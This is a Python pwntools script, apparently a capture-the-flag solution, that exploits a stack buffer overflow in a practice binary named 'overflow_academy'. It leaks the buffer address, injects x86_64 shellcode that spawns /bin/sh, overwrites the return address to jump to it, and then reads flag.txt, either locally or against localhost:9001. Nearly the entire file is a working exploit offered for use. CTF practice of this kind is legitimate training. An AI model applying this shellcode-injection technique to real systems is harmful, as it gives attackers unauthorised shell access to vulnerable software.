#!/usr/bin/env python3

from pwn import *

def solve_local():
    # Connect to the binary
    p = process('./overflow_academy')
    
    # Receive the buffer address
    p.recvuntil(b'Buffer address: ')
    buffer_addr = int(p.recvline().strip().decode(), 16)
    print(f"Buffer address: {hex(buffer_addr)}")
    
    p.recvuntil(b'Enter your payload: ')
    
    # Simple shellcode to execute /bin/sh
    # This is a 25-byte /bin/sh shellcode for x86_64
    shellcode = asm('''
        xor rax, rax
        push rax
        push 0x68732f2f6e69622f
        mov rdi, rsp
        xor rsi, rsi
        xor rdx, rdx
        mov rax, 59
        syscall
    ''', arch='amd64')
    
    # Calculate padding needed to reach return address
    # Buffer is 100 bytes, plus saved rbp (8 bytes) = 108 total
    padding = 108
    
    # Build payload: shellcode + padding + return address (to shellcode)
    payload = shellcode
    payload += b'A' * (padding - len(shellcode))
    payload += p64(buffer_addr)  # Return to shellcode
    
    print(f"Payload length: {len(payload)}")
    print(f"Shellcode length: {len(shellcode)}")
    
    # Send payload
    p.sendline(payload)
    
    # Try to interact with shell
    try:
        p.sendline(b'cat flag.txt')
        flag = p.recvline()
        print(f"Flag: {flag.decode()}")
    except:
        print("Shell spawn failed, trying alternative...")
    
    p.interactive()

def solve_remote(host, port):
    # Connect to remote
    p = remote(host, port)
    
    # Same exploit as local
    p.recvuntil(b'Buffer address: ')
    buffer_addr = int(p.recvline().strip().decode(), 16)
    print(f"Buffer address: {hex(buffer_addr)}")
    
    p.recvuntil(b'Enter your payload: ')
    
    shellcode = asm('''
        xor rax, rax
        push rax
        push 0x68732f2f6e69622f
        mov rdi, rsp
        xor rsi, rsi
        xor rdx, rdx
        mov rax, 59
        syscall
    ''', arch='amd64')
    
    padding = 108
    payload = shellcode + b'A' * (padding - len(shellcode)) + p64(buffer_addr)
    
    p.sendline(payload)
    p.sendline(b'cat flag.txt')
    
    try:
        flag = p.recvline()
        print(f"Flag: {flag.decode()}")
    except:
        pass
    
    p.close()

if __name__ == "__main__":
    context.arch = 'amd64'
    
    if len(sys.argv) > 1 and sys.argv[1] == "remote":
        solve_remote("localhost", 9001)
    else:
        solve_local()